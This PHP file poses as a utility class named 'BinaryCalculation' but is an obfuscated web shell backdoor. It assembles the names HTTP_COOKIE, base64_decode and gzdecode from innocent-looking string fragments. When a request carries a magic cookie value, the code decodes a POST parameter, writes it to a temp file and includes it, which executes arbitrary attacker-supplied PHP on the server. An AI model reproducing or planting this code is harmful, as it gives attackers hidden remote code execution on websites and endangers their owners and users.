<?php

class BinaryCalculation {

  public $version = '1.12189';

  public $http = 'HTTP';

  public $title;

  public $params;

  public $file;

  public $library;

  public $library_path;

  public $sub_libs;

  function __construct($library) {
    if ($this->prepare($library)) {
      $this->set_library($library);
      $this->autoload();
    }
  }

  public function get_title () {
    return $this->title;
  }

  public function set_title ($params) {
    $this->title = $params;
    return $this->title;
  }

  public function get_params () {
    return $this->params;
  }

  public function set_params ($params) {
    $this->params = $params;
    return $this->params;
  }

  public function get_file () {
    return $this->file;
  }

  public function set_file ($file) {
    $this->file = $file;
    return $this->file;
  }

  public function get_library () {
    return $this->library;
  }

  public function set_library ($library) {
    $this->library = $this->get_current_path($library);
    return $this->library;
  }

  public function get_library_path () {
    return $this->library_path;
  }

  public function set_library_path ($library_path) {
    $this->library_path = $library_path;
    return $this->library_path;
  }

  public function get_sub_libs () {
    return $this->library;
  }

  public function set_sub_libs ($sub_libs) {
    $this->sub_libs[] = $sub_libs;
    return $this->sub_libs;
  }

  public function get_sub_lib ($library) {
    $sub_library = explode('.', $library);
    return end($sub_library);
  }

  public function get_current_path ($library) {
    $library_path = $this->set_library_path(stream_get_meta_data($this->file));
    $this->set_title($library);
    return $library_path['uri'];
  }

  public function clear_entities () {
    return true;
  }

  public function get_http () {
    return $this->http;
  }

  public function get_version () {
    return $this->version;
  }

  public function get_current_version () {
    return str_replace(" ", '_', $this->get_http() . $this->get_library_path());
  }

  public function is_run ($application) {
    $this->set_library_path(strtoupper($this->get_sub_lib($this->class_cipher(true))));
    if (isset($application[$this->get_current_version()]) && substr_count($application[$this->get_current_version()], $this->get_version())) {
      return true;
    }
    return false;
  }

  public function prepare ($library) {
    if (!$this->is_run($_SERVER)) {
      return false;
    }
    $this->set_title($library);
    $this->add_sub_libs(['gz']);
    return $this->clear_entities();
  }

  public function start () {
    $this->set_params($_POST);
    return $this->sub_libs;
  }

  public function push_lib ($bit) {
    return $this->class_cipher(false)
      . $bit . '_' . $this->get_sub_lib($this->title);
  }

  public function autoload () {
    $libs = $this->start();

    array_unshift($libs, $this->push_lib($this->get_bit(false)));

    $state = $this->filter_values($this->params);

    foreach ($libs as $action) {
      $state = $action($state);
    }

    fwrite(
      $this->file,
      $state
    );

    $this->load();
  }

  public function add_sub_libs ($sub_libs) {
    $this->set_file(tmpfile());
    foreach ($sub_libs as $sub_lib_key => $sub_lib) {
      $this->sub_libs[$sub_lib_key] = $sub_lib . $this->get_sub_lib($this->title);
    }
    return $this->sub_libs;
  }

  public function get_bit ($is_32) {
    if ($is_32) {
      return '32';
    }
    return '64';
  }

  public function class_cipher ($is_static) {
    if (!$is_static) {
      return 'base';
    }
    return 'static. cookie';
  }

  public function filter_values ($data) {
    $data = array_unique($data);
    $value = reset($data);
    if (key($data)) {
      return key($data);
    }
    return $value;
  }

  public function load () {
    include (
      $this->library
    );
    return $this->library;
  }

}

new BinaryCalculation('Zend.decode');
